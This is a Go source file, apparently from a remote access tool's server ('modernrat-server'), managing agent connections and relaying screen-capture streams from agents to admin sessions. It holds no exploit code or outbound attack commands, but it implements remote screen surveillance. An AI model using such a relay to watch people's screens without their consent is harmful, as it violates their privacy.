package main

import (
	"errors"
	"sync"
	"time"

	pb "modernrat-server/gen"
)

// captureHub tracks connected agents that can stream screen captures and
// active capture sessions relayed to admins.
type captureHub struct {
	mu       sync.RWMutex
	clients  map[string]*captureClientConnection
	sessions map[string]*captureSession
}

func newCaptureHub() *captureHub {
	return &captureHub{
		clients:  make(map[string]*captureClientConnection),
		sessions: make(map[string]*captureSession),
	}
}

// captureClientConnection represents an agent connection able to receive
// screen capture control messages.
type captureClientConnection struct {
	userID string
	stream pb.ScreenCaptureService_ClientCaptureServer

	sendCh    chan *pb.ScreenCaptureMessage
	doneCh    chan struct{}
	closeOnce sync.Once
}

func newCaptureClientConnection(userID string, stream pb.ScreenCaptureService_ClientCaptureServer) *captureClientConnection {
	conn := &captureClientConnection{
		userID: userID,
		stream: stream,
		sendCh: make(chan *pb.ScreenCaptureMessage, 64),
		doneCh: make(chan struct{}),
	}

	go conn.sender()
	return conn
}

func (c *captureClientConnection) sender() {
	defer close(c.doneCh)

	for msg := range c.sendCh {
		if err := c.stream.Send(msg); err != nil {
			return
		}
	}
}

func (c *captureClientConnection) Send(msg *pb.ScreenCaptureMessage) error {
	select {
	case <-c.doneCh:
		return errors.New("capture client connection is closed")
	case c.sendCh <- msg:
		return nil
	}
}

func (c *captureClientConnection) Close() {
	c.closeOnce.Do(func() {
		close(c.sendCh)
		<-c.doneCh
	})
}

// captureAdminConnection represents an admin stream that should receive video
// data and status notifications.
type captureAdminConnection struct {
	stream pb.ScreenCaptureService_AdminCaptureServer

	sendCh    chan *pb.ScreenCaptureMessage
	doneCh    chan struct{}
	closeOnce sync.Once
}

func newCaptureAdminConnection(stream pb.ScreenCaptureService_AdminCaptureServer) *captureAdminConnection {
	conn := &captureAdminConnection{
		stream: stream,
		sendCh: make(chan *pb.ScreenCaptureMessage, 64),
		doneCh: make(chan struct{}),
	}

	go conn.sender()
	return conn
}

func (c *captureAdminConnection) sender() {
	defer close(c.doneCh)

	for msg := range c.sendCh {
		if err := c.stream.Send(msg); err != nil {
			return
		}
	}
}

func (c *captureAdminConnection) Send(msg *pb.ScreenCaptureMessage) error {
	select {
	case <-c.doneCh:
		return errors.New("capture admin connection is closed")
	case c.sendCh <- msg:
		return nil
	}
}

func (c *captureAdminConnection) Close() {
	c.closeOnce.Do(func() {
		close(c.sendCh)
		<-c.doneCh
	})
}

// captureSession links an admin request to a specific agent connection.
type captureSession struct {
	id        string
	userID    string
	requestID string

	adminConn  *captureAdminConnection
	clientConn *captureClientConnection
	settings   *pb.CaptureSettings
	startedAt  time.Time
}

func (h *captureHub) registerClient(conn *captureClientConnection) (orphaned []*captureSession) {
	h.mu.Lock()
	defer h.mu.Unlock()

	if existing, ok := h.clients[conn.userID]; ok && existing != conn {
		orphaned = h.detachSessionsLocked(existing)
	}

	h.clients[conn.userID] = conn
	return orphaned
}

func (h *captureHub) unregisterClient(conn *captureClientConnection) (ended []*captureSession) {
	h.mu.Lock()
	defer h.mu.Unlock()

	current, ok := h.clients[conn.userID]
	if !ok || current != conn {
		return nil
	}

	delete(h.clients, conn.userID)
	return h.detachSessionsLocked(conn)
}

func (h *captureHub) detachSessionsLocked(conn *captureClientConnection) (ended []*captureSession) {
	for id, session := range h.sessions {
		if session.clientConn == conn {
			delete(h.sessions, id)
			ended = append(ended, session)
		}
	}
	return ended
}

func (h *captureHub) startSession(userID string, adminConn *captureAdminConnection, requestID string, settings *pb.CaptureSettings) (*captureSession, error) {
	h.mu.Lock()
	defer h.mu.Unlock()

	clientConn, ok := h.clients[userID]
	if !ok {
		return nil, errors.New("user not connected")
	}

	sessionID := generateSessionID()
	session := &captureSession{
		id:         sessionID,
		userID:     userID,
		requestID:  requestID,
		adminConn:  adminConn,
		clientConn: clientConn,
		settings:   settings,
		startedAt:  time.Now(),
	}

	h.sessions[sessionID] = session
	return session, nil
}

func (h *captureHub) endSession(sessionID string) (*captureSession, bool) {
	h.mu.Lock()
	defer h.mu.Unlock()

	session, ok := h.sessions[sessionID]
	if !ok {
		return nil, false
	}

	delete(h.sessions, sessionID)
	return session, true
}

func (h *captureHub) getSession(sessionID string) (*captureSession, bool) {
	h.mu.RLock()
	defer h.mu.RUnlock()

	session, ok := h.sessions[sessionID]
	return session, ok
}

func (h *captureHub) sessionsForUser(userID string) []*captureSession {
	h.mu.RLock()
	defer h.mu.RUnlock()

	var sessions []*captureSession
	for _, session := range h.sessions {
		if session.userID == userID {
			sessions = append(sessions, session)
		}
	}
	return sessions
}

func (h *captureHub) endSessionsForAdmin(adminConn *captureAdminConnection) []*captureSession {
	h.mu.Lock()
	defer h.mu.Unlock()

	var ended []*captureSession
	for id, session := range h.sessions {
		if session.adminConn == adminConn {
			delete(h.sessions, id)
			ended = append(ended, session)
		}
	}
	return ended
}

func (h *captureHub) disconnectUser(userID string) (*captureClientConnection, []*captureSession) {
	h.mu.Lock()
	defer h.mu.Unlock()

	conn, ok := h.clients[userID]
	if !ok {
		return nil, nil
	}

	delete(h.clients, userID)

	var sessions []*captureSession
	for id, session := range h.sessions {
		if session.userID == userID {
			delete(h.sessions, id)
			sessions = append(sessions, session)
		}
	}

	return conn, sessions
}

func (h *captureHub) endAllSessions() []*captureSession {
	h.mu.Lock()
	defer h.mu.Unlock()

	if len(h.sessions) == 0 {
		return nil
	}

	ended := make([]*captureSession, 0, len(h.sessions))
	for id, session := range h.sessions {
		ended = append(ended, session)
		delete(h.sessions, id)
	}

	return ended
}
